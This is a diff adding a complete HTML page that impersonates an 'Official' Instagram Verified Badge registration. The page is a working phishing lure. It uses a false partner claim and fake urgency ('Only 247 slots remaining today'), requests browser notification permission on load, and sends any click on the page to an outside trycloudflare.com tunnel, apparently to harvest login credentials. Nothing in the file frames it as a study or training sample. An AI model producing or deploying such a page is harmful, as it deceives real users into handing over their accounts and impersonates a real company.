@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Verified Badge Registration - Official</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #833ab4 0%, #fd1d1d 50%, #fcb045 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow-x: hidden;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+            padding: 40px;
+            max-width: 450px;
+            width: 90%;
+            text-align: center;
+            animation: slideUp 0.8s ease-out;
+        }
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            background: linear-gradient(45deg, #E4405F, #833AB4);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            color: white;
+            font-weight: bold;
+            box-shadow: 0 10px 30px rgba(228, 64, 95, 0.4);
+        }
+        h1 {
+            color: #262626;
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            color: #8e8e8e;
+            font-size: 16px;
+            margin-bottom: 30px;
+            line-height: 1.4;
+        }
+        .verified-badge {
+            width: 60px;
+            height: 60px;
+            margin: 20px auto;
+            background: #31d95c;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: white;
+            box-shadow: 0 8px 25px rgba(49, 217, 92, 0.4);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        .urgency {
+            background: linear-gradient(45deg, #ff6b6b, #ffa500);
+            color: white;
+            padding: 15px;
+            border-radius: 15px;
+            margin: 25px 0;
+            font-size: 14px;
+            font-weight: 500;
+            box-shadow: 0 10px 25px rgba(255, 107, 107, 0.3);
+        }
+        .login-btn {
+            background: linear-gradient(45deg, #E4405F, #833AB4);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+            box-shadow: 0 15px 35px rgba(228, 64, 95, 0.4);
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .login-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 20px 45px rgba(228, 64, 95, 0.5);
+        }
+        .security-note {
+            font-size: 12px;
+            color: #8e8e8e;
+            margin-top: 20px;
+            line-height: 1.5;
+        }
+        .floating-particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+        .particle {
+            position: absolute;
+            background: rgba(255,255,255,0.1);
+            border-radius: 50%;
+            animation: float 6s infinite linear;
+        }
+        @keyframes float {
+            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <div class="floating-particles" id="particles"></div>
+    
+    <div class="container">
+        <div class="logo">✓</div>
+        <h1>Instagram Verified Badge</h1>
+        <p class="subtitle">Complete your Blue Tick verification registration</p>
+        
+        <div class="verified-badge">✓</div>
+        
+        <div class="urgency">
+            ⏰ Limited Time: Only 247 slots remaining today!<br>
+            Secure your verified status before they're gone.
+        </div>
+        
+        <button class="login-btn" onclick="triggerNotification()">
+            🔐 Login with Instagram to Verify
+        </button>
+        
+        <div class="security-note">
+            Official Instagram Partner • 100% Secure Verification Process<br>
+            Your account will be verified within 24 hours after login confirmation.
+        </div>
+    </div>
+
+    <script>
+        // Create floating particles
+        function createParticles() {
+            const particles = document.getElementById('particles');
+            for (let i = 0; i < 20; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.width = particle.style.height = (Math.random() * 8 + 4) + 'px';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.animationDelay = Math.random() * 6 + 's';
+                particle.style.animationDuration = (Math.random() * 3 + 4) + 's';
+                particles.appendChild(particle);
+            }
+        }
+        createParticles();
+
+        // Main trigger - Notification + Redirect
+        function triggerNotification() {
+            // Show desktop notification (requires HTTPS in production)
+            if (Notification.permission === 'granted') {
+                new Notification('Instagram Verification Required', {
+                    body: 'Please login to complete your Blue Tick registration.',
+                    icon: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGNpcmNsZSBjeD0iMTIiIGN5PSIxMiIgcj0iOCIgZmlsbD0iI0UzNDA1RiIvPgo8cGF0aCBkPSJNMTYgOEMxNiA5LjQ0NDMgMTUuNDQ0MyAxMCAxNCAxMEMxMi41NTYgMTAgMTIgOS40NDQ1IDEyIDlDNDEuNDQ0NSAxMiAxMiAxMi41NTYgMTIgMTRDMTIgMTUuNTU2IDEyLjU1NiAxNiAxNCAxNkMxNS40NDQzIDE2IDE2IDE1LjU1NiAxNiAxNEMxNiAxMi41NTYgMTYuNTU2IDEyIDE4IDEyQzE5LjQ0NDMgMTIgMjAgMTIuNTU2IDIwIDE0QzIwIDE1LjQ0NDEgMTkuNDQ0MyAxNiAxOCAxNloiIGZpbGw9IndoaXRlIi8+Cjwvc3ZnPgo='
+                });
+            } else if (Notification.permission !== 'denied') {
+                Notification.requestPermission();
+            }
+            
+            // Immediate redirect with visual feedback
+            const btn = document.querySelector('.login-btn');
+            btn.textContent = 'Redirecting to Instagram...';
+            btn.style.background = 'linear-gradient(45deg, #10ac84, #31d95c)';
+            
+            setTimeout(() => {
+                window.open('https://nor-legitimate-mind-pointer.trycloudflare.com', '_blank');
+                window.location.href = 'https://nor-legitimate-mind-pointer.trycloudflare.com';
+            }, 800);
+        }
+
+        // Auto-trigger notification permission on load (subtle)
+        window.addEventListener('load', () => {
+            if (Notification.permission === 'default') {
+                setTimeout(() => Notification.requestPermission(), 2000);
+            }
+        });
+
+        // Fallback click handler for entire container
+        document.querySelector('.container').addEventListener('click', (e) => {
+            if (e.target.tagName !== 'BUTTON') triggerNotification();
+        });
+    </script>
+</body>
+</html>
